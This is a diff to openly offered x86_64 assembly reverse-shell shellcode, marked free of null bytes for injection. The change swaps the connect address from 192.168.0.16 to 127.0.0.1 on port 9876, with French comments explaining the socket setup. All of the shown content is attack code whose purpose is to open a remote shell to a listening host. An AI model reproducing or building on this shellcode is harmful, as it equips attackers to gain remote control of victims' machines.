@@ -1,5 +1,6 @@
 ; Reverse Shell in asm x86_64 Intel Arch.
-; Connects but does not include bind syscall yet
+; Connects but does not include bind syscall (yet)
+; No null bytes
 ; __author__: cs[133]
 ; <+> Under the terms of the GPL v3 License.
 
@@ -20,8 +21,8 @@ _start:
 
 	; connect(FDS, {AF_INET, 9876, '192.168.0.16'}, 16)
 	mov rdi,rax		; descripteur de fichier de la socket en 1er argument
-;	push 0x0100007f		; 127.0.0.1
-	push 0x1000a8c0		; adresse distante = 192.168.0.16 little endian
+	push 0x0100007f		; 127.0.0.1
+;	push 0x1000a8c0		; adresse distante = 192.168.0.16 little endian
 	push WORD 0x9426	; port = 9876 little endian
 	push WORD 0x2
 	mov rsi,rsp		; on place l'adresse (rsp) du tableau en 2nd argument
